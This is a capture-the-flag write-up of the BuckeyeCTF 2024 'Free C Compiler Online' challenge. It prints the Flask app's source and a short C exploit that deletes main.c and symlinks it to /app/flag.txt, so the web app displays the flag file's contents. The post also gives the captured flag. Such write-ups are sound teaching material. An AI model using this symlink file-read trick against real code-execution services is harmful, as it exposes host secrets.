+++
title = 'BuckeyeCTF 2024 Free C Compiler Online'
date = 2024-09-30T00:19:51+02:00
categories = ['BuckeyeCTF 2024', 'Misc']
+++
## Intro

This post covers *Free C Compiler Online* from *BuckeyeCTF 2024*. The description of the challenge is as follows:

> It is free of charge, but is it free of bugs?

No, it's not.

## Analyzing The Source Code

The following is the source code of the application:

```python
from flask import (
 Flask,
 json,
 jsonify,
 request,
 render_template,
)
from pathlib import Path
from uuid import uuid4, UUID
import os
from werkzeug.exceptions import NotFound, BadRequest, Forbidden
import subprocess

app = Flask(__name__)
storage_path = Path(__file__).parent / "storage"

os.system("podman pull docker.io/library/gcc:latest")


@app.get("/")
def get_index():
    return render_template("index.html")


@app.get("/<id>")
def get_result(id):
    id = str(UUID(id))
    try:
 code = Path(storage_path, id, "main.c").read_text()
 output = Path(storage_path, id, "output.txt").read_text()
    except FileNotFoundError:
        raise NotFound()
    if output == "":
 output = "[no output yet, try refreshing]"
    return render_template("result.html", code=code, output=output)


@app.post("/run")
def post_run():
    if request.json is None:
        raise UnsupportedMediaType()
 code = request.json["code"]
    if not isinstance(code, str):
        raise BadRequest()
    id = run_code(code)
    return jsonify({"id": id})


def run_code(code):
    if len(code) > 10000:
        raise Forbidden()
    id = uuid4()
 folder = Path(storage_path, str(id))
 folder.mkdir(parents=True)
    Path(folder, "main.c").write_text(code)

 os.system(
        f"podman run --timeout 5 --detach -v {str(folder.absolute())}:/mnt --workdir /mnt gcc "
        + "sh -c 'gcc main.c > output.txt 2>&1 && ./a.out | head -c 1000 >> output.txt'"
 )

 subprocess.Popen(f"sleep 60; rm -r {folder.absolute()}", shell=True)

    return id


print("started")
```

As we can see, there are 2 main endpoints: `@app.post("/run")` amd `@app.get("/<id>")`. The first one is used to compile our source code and run it, all in a podman pod and the second one is used to display the source code that was compiled and executed alongside the output.

## Replacing The Source Code With a Symlink

The flag is located at `/app/flag.txt`, while the compilation files are temporarily saved to `/app/storage/<UUID>` . Both compilation and execution take place inside a pod, which doesn't have direct access to the flag file. However, we notice that:
- Inside a pod, we have access to the source code `main.c` of the program that's being executed,
- The web application has access to the flag file,
- The web application displays the source code `main.c` of the program was run via the `@app.get("/<id>")` endpoint.

We create a program that removes `main.c` and replaces it with a symlink to `/app/flag`.

```C
#include <stdio.h>
#include <stdlib.h>

int main() {
    system("rm main.c && ln -s /app/flag.txt main.c");
    
    return 0;
}
```

Now we run it, and display the results. Since we replaced `main.c` with a symlink to the flag, the web application displays the flag content under the *Code* section.

![Alt text](image.png)

![Alt text](image-1.png)

We got the flag! *bctf{fr33d0m_1s_bu7_4n_3mp7y_1llu510n_b842fff60fc03a4f}*

